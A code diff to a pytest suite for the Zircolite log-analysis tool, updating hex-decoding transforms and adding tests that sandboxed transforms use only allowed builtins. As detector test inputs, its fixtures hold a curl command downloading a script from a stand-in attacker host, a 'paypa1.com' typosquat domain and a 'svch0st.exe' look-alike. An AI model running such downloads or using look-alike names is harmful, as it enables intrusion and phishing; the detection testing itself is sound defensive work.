@@ -17,6 +17,7 @@ import argparse
 import json
 import re
 import sqlite3
+import symtable
 from argparse import Namespace
 from pathlib import Path
 
@@ -24,7 +25,7 @@ import pytest
 import yaml
 
 from zircolite.config import ProcessingConfig
-from zircolite.streaming import StreamingEventProcessor
+from zircolite.streaming import _RESTRICTED_BUILTINS, StreamingEventProcessor
 
 # =============================================================================
 # Test Fixtures
@@ -48,7 +49,7 @@ def field_mappings_multi_transforms():
             "proctitle": [{
                 "info": "Proctitle HEX to ASCII",
                 "type": "python",
-                "code": "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00',' ')",
+                "code": "def transform(param):\n    return base64.b16decode(param, casefold=True).decode('ascii').replace('\\x00',' ')",
                 "alias": False,
                 "alias_name": "",
                 "source_condition": ["auditd_input"],
@@ -1438,7 +1439,7 @@ class TestHexToAsciiTransform:
                 "proctitle": [{
                     "info": "Proctitle HEX to ASCII",
                     "type": "python",
-                    "code": "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00', ' ')",
+                    "code": "def transform(param):\n    return base64.b16decode(param, casefold=True).decode('ascii').replace('\\x00', ' ')",
                     "alias": False,
                     "alias_name": "",
                     "source_condition": ["auditd_input"],
@@ -1458,7 +1459,7 @@ class TestHexToAsciiTransform:
 
         # "ls -la" in hex: 6c73002d6c61
         result = processor._transform_value(
-            "def transform(param):\n    return bytes.fromhex(param).decode('ascii').replace('\\x00', ' ')",
+            "def transform(param):\n    return base64.b16decode(param, casefold=True).decode('ascii').replace('\\x00', ' ')",
             "6c73002d6c61"
         )
         assert result == "ls -la"
@@ -1485,7 +1486,7 @@ class TestHexToAsciiTransform:
         )
 
         result = processor._transform_value(
-            "def transform(param):\n    return bytes.fromhex(param).decode('ascii')",
+            "def transform(param):\n    return base64.b16decode(param, casefold=True).decode('ascii')",
             "not_valid_hex"
         )
         # Should return original on error
@@ -2046,6 +2047,11 @@ TRANSFORM_EXPECTATIONS = [
     ("cmd_cmd_hex_to_ascii.py", "6C73202D6C61", "ls -la"),
     ("cmd_cmd_hex_to_ascii.py", "notthex", "notthex"),
     ("proctitle_proctitle_hex_to_ascii.py", "6C73202D6C61", "ls -la"),
+    # auditd separates arguments with NUL and writes lowercase hex
+    ("proctitle_proctitle_hex_to_ascii.py", "6c73002d6c61", "ls -la"),
+    ("proctitle_proctitle_hex_to_ascii.py", "/usr/bin/bash", "/usr/bin/bash"),
+    ("commandline_hexstrings.py", "cmd /c echo 0x48,0x65,0x6c,0x6c,0x6f,0x21", "0x_HEX|DECODED:Hello!"),
+    ("commandline_hexstrings.py", "payload 48656C6C6F20576F726C6421", "CONT_HEX|DECODED:Hello World!"),
     # -- path and name splitting; empty means "adds nothing over the source" --
     ("image_exename.py", "C:\\Windows\\System32\\cmd.exe", "cmd.exe"),
     ("image_exename.py", "cmd.exe", ""),
@@ -2069,6 +2075,7 @@ TRANSFORM_EXPECTATIONS = [
     ("image_lolbinmatch.py", "C:\\Windows\\System32\\certutil.exe", "LOLBIN:certutil"),
     ("image_typosquatdetect.py", "C:\\Temp\\svch0st.exe",
      "TYPOSQUAT:svchost(HOMOGLYPH)"),
+    ("queryname_typosquatdetect.py", "paypa1.com", "TYPOSQUAT_BANK:paypal(HOMOGLYPH,CHAR_SWAP)"),
     ("commandline_urls.py", "curl http://evil.test/a.ps1 -o b.ps1",
      "http://evil.test/a.ps1"),
     ("commandline_downloadcradle.py",
@@ -2195,6 +2202,44 @@ class TestTyposquatDetectDataIsReachable:
             for finding in result.split("|"):
                 technique = finding.partition("(")[2].rstrip(")")
                 assert technique, f"{value} produced a finding with no technique: {finding}"
+
+
+def _global_reads(source: str) -> set[str]:
+    """Names a transform reads but never binds, which only the sandbox can supply."""
+    top = symtable.symtable(source, "<transform>", "exec")
+    bound = {s.get_name() for s in top.get_symbols() if s.is_assigned() or s.is_imported()}
+    reads = {s.get_name() for s in top.get_symbols() if s.is_referenced()}
+    tables = list(top.get_children())
+    while tables:
+        table = tables.pop()
+        tables.extend(table.get_children())
+        reads.update(s.get_name() for s in table.get_symbols() if s.is_global() and s.is_referenced())
+    return reads - bound
+
+
+class TestTransformsReadOnlySandboxNames:
+    """A name missing from the sandbox fails only on the input that reaches it.
+
+    RestrictedPython 9.0 took bytes and zip out of safe_builtins. Three shipped
+    transforms then raised NameError on the values they exist for, and a fourth
+    swallowed it, while every probe value still passed.
+    """
+
+    @pytest.mark.parametrize("transform_file", SHIPPED_TRANSFORMS)
+    def test_shipped_file(self, transform_file):
+        missing = _global_reads((TRANSFORMS_DIR / transform_file).read_text()) - _RESTRICTED_BUILTINS.keys()
+        assert not missing, f"{transform_file} reads {sorted(missing)}, which the sandbox does not define"
+
+    def test_inline_config_code(self, real_config):
+        inline = [(field, entry["code"]) for field, entries in real_config["transforms"].items()
+                  for entry in entries if entry.get("type") == "python"]
+        assert inline, "config.yaml no longer has an inline transform to check"
+        for field, code in inline:
+            missing = _global_reads(code) - _RESTRICTED_BUILTINS.keys()
+            assert not missing, f"the inline {field} transform reads {sorted(missing)}, which the sandbox does not define"
+
+    def test_detects_a_removed_builtin(self):
+        assert _global_reads("def transform(param):\n    return bytes.fromhex(param)\n") == {"bytes"}
 
 
 @pytest.mark.parametrize("transform_file", SHIPPED_TRANSFORMS)
